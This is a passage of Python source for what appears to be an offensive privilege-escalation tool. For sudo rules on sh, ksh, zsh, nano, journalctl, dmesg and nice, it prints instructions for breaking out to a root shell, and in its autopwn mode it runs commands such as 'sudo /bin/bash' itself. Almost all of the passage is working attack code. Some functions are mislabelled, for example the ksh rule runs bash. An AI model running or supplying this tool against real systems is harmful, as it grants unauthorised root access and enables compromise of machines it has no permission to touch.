    print(OKBLUE + "[2] Now type !/bin/bash and enjoy your shell!" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO sh Rule Pwnage
def sh(sh_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
        if (sh_user == "ALL") or (sh_user == "root"):
            print(OKRED + "[*] sudo /bin/sh" + ENDC)
        else:
            print(OKRED + "[*] sudo -u " + sh_user + " /bin/sh" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the sh rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the sh rule now!!!" + ENDC)

            if (sh_user == "ALL") or (sh_user == "root"):
                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
                call("sudo /bin/sh", shell=True)
            else:
                print(OKGREEN + "\n[!] Obtaining shell as " + sh_user + "!" + ENDC)
                call("sudo -u " + sh_user + " /bin/sh", shell=True)

        if question == False:
            sudopwner()

# SUDO ksh Rule Pwnage
def ksh(ksh_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
        if (ksh_user == "ALL") or (ksh_user == "root"):
            print(OKRED + "[*] sudo /bin/bash" + ENDC)
        else:
            print(OKRED + "[*] sudo -u " + ksh_user + " /bin/bash" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the ksh rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the ksh rule now!!!" + ENDC)

            if (ksh_user == "ALL") or (ksh_user == "root"):
                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
                call("sudo /bin/bash", shell=True)
            else:
                print(OKGREEN + "\n[!] Obtaining shell as " + ksh_user + "!" + ENDC)
                call("sudo -u " + ksh_user + " /bin/bash", shell=True)

        if question == False:
            sudopwner()


# SUDO zsh Rule Pwnage
def zsh(zsh_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
        if (zsh_user == "ALL") or (zsh_user == "root"):
            print(OKRED + "[*] sudo /bin/sh" + ENDC)
        else:
            print(OKRED + "[*] sudo -u " + zsh_user + " /bin/sh" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the sh rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the sh rule now!!!" + ENDC)

            if (zsh_user == "ALL") or (zsh_user == "root"):
                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
                call("sudo /bin/zsh", shell=True)
            else:
                print(OKGREEN + "\n[!] Obtaining shell as " + zsh_user + "!" + ENDC)
                call("sudo -u " + zsh_user + " /bin/zsh", shell=True)

        if question == False:
            sudopwner()


# SUDO nano Rule Pwnage
def nano(nano_user):

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] The first step is to open a file using the 'nano' command: " + ENDC)
    if (nano_user == "ALL") or (nano_user == "root"):
        print(OKRED + " [*] sudo nano <filename>" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + nano_user + " nano <filename>" + ENDC)
    print(OKBLUE + "[2] Once the file is open enter either 'F5' or '^R' which will allow you to load a new file into nano." + ENDC)
    print(OKRED + " [*] Now enter a file you wish to load into nano!" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()

def journalctl(journalctl_user):

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] The first step is to view logs by running the 'journalctl' command: " + ENDC)
    if (journalctl_user == "ALL") or (journalctl_user == "root"):
        print(OKRED + " [*] sudo journalctl" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + journalctl_user + " journalctl" + ENDC)
    print(OKBLUE + "[2] Once the log is displayed type '!/bin/bash': " + ENDC)
    print(OKRED + " [*] !/bin/bash" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()

def dmesg(dmesg_user):

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] The first step is to view logs by running the 'dmesg --human' command: " + ENDC)
    if (dmesg_user == "ALL") or (dmesg_user == "root"):
        print(OKRED + " [*] sudo dmesg --human" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + dmesg_user + " dmesg --human" + ENDC)
    print(OKBLUE + "[2] Once the log is displayed type '!/bin/bash': " + ENDC)
    print(OKRED + " [*] !/bin/bash" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()

def nice(nice_user):

    print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
    if (nice_user == "ALL") or (nice_user == "root"):
        print(OKRED + "[*] sudo /bin/nice -n 1 /bin/bash" + ENDC)
    else:
        print(OKRED + "[*] sudo -u " + nice_user + " /bin/nice -n 1 /bin/bash" + ENDC)
    print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()
	
if __name__ == "__main__":
    main()
